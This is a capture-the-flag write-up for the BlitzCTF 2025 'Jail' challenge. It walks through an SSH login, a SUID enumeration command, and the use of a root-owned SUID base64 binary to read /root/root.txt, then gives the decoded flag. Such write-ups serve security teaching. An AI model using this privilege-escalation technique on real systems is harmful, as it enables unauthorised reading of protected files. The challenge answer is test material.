**Jail - BlitzCTF 2025 Writeup**

**Category**: Privilege Escalation / Jail Escape
**Points**: 460
**Author**: rahisec

---

### Challenge Description:

> I'm imprisoned. Help me to escape!!!
>
> **Usage:**
>
> ```bash
> ssh rahisec@jail.blitzhack.xyz -p 2222
> password: 1234
> ```
>
> Flag format: Blitz{Some\_text}

---

### Initial Access

We connected to the challenge server using the provided SSH credentials:

```bash
ssh rahisec@jail.blitzhack.xyz -p 2222
# password: 1234
```

After logging in, we were dropped into a restricted shell with limited binary access and most useful commands either unavailable or sandboxed.

---

### Enumeration

We ran the classic SUID check to find executables with the SUID bit set:

```bash
find / -perm -4000 -type f 2>/dev/null
```

This listed a few standard binaries like `/usr/bin/su`, `/usr/bin/passwd`, etc. However, interestingly, it also showed:

```
/usr/bin/base64
```

This was odd. `base64` is usually a harmless utility, but here it had the SUID bit **and** was owned by root. This meant **anyone running it executes with root privileges**.

---

### Exploitation

Knowing `base64` had elevated privileges, we thought of ways to leverage it to access restricted files. One obvious candidate was:

```
/root/root.txt
```

This is often the location of the flag on root-owned systems.

So we ran:

```bash
base64 /root/root.txt
```

And got:

```
QWJyYUNhRGFicmFfZ2lsaV9naWxpX3N1dXV1XzEzMzc3
```

Decoding it:

```bash
echo QWJyYUNhRGFicmFfZ2lsaV9naWxpX3N1dXV1XzEzMzc3 | base64 -d
```

Output:

```
AbraCaDabra_gili_gili_suuuu_13377
```

Following the format, the final flag was:

```
Blitz{AbraCaDabra_gili_gili_suuuu_13377}
```

---

### Conclusion

The core of this challenge was recognizing an uncommon SUID binary (`base64`) and thinking creatively about what files we could access with it. Once we realized `base64` runs as root, reading the flag was straightforward.

**Takeaway:** Always check for unusual SUID binaries. Even seemingly harmless utilities can become dangerous if given elevated permissions.

